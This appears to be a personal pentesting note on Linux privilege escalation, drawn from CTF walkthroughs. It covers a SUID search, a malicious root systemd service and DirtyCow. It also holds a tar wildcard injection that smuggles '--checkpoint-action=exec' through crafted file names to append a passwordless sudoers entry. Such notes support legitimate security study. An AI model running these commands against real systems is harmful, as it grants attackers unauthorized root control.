# Linux-privesc
Tags: #privesc #linux #docker #capabilities 
Related to:  [[docker]]
See also:
Previous: 

## SUID 
```
# suid
find "$DIRECTORY" -perm /u=s,g=s
```

## systemctl
https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49

Create a service that runs as root and does something malicious (change root password, start a rev shell, etc.)

```
/bin/systemctl enable /full/path/to/root.service
/bin/systemctl start root
```


## Tar
`--checkpoint`  flag can be used to execute a script when a wildcard is being used, e.g. `tar cf /dir *`

```
echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
touch "/dir/--checkpoint-action=exec=sh sudo.sh"
touch "/dir/--checkpoint=1"
```
https://medium.com/azkrath/tryhackme-walkthrough-skynet-69399702ee5a

## Old kernels
DirtyCow 2016 exploit -- dirtycow.ninja
Many scripts, might need to compile

## Docker access
Many privesc possibilties, see [[docker]].

## Linux capabilities
- "Capabilities" == a way to relegate some things `root` can do to other processes
- `capsh --print` to show them


## References
[Linux capabilities man page](https://linux.die.net/man/7/capabilities)